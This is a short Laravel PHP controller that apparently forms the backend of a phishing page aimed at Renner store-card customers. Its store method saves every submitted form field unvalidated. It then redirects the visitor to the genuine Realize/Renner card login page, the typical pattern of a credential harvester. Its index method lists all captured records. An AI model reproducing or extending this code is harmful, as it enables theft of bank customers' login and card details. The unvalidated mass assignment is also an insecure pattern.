<?php

namespace App\Http\Controllers;

use App\Models\Info;
use Illuminate\Http\Request;

class InfosController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $infos = Info::all();

        return view ('infos.index', compact('infos'));
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        return view('infos.create');
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $info = Info::create($request->all());

        return redirect('https://www.realizesolucoesfinanceiras.com.br/cartoes-renner/login');
    }

//     /**
//      * Display the specified resource.
//      *
//      * @param  \App\Models\Info  $info
//      * @return \Illuminate\Http\Response
//      */
//     public function show(Info $info)
//     {
//         //
//     }

//     /**
//      * Show the form for editing the specified resource.
//      *
//      * @param  \App\Models\Info  $info
//      * @return \Illuminate\Http\Response
//      */
//     public function edit(Info $info)
//     {
//         //
//     }

//     /**
//      * Update the specified resource in storage.
//      *
//      * @param  \Illuminate\Http\Request  $request
//      * @param  \App\Models\Info  $info
//      * @return \Illuminate\Http\Response
//      */
//     public function update(Request $request, Info $info)
//     {
//         //
//     }

//     /**
//      * Remove the specified resource from storage.
//      *
//      * @param  \App\Models\Info  $info
//      * @return \Illuminate\Http\Response
//      */
//     public function destroy(Info $info)
//     {
//         //
//     }
 }
